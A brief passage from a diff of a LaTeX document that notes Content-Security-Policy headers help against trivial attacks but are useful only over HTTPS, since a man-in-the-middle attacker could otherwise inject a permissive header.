+	\texttt{Content-Security-Policy} header, this can avoid trivial attack.\\
+	I want to highlight that CSP is useful only if the HTTP connection is secure (HTTPS), otherwise an attacker could perform a MitM attack and add a malicious header in order to allow
+	connection to his server.\\
+	
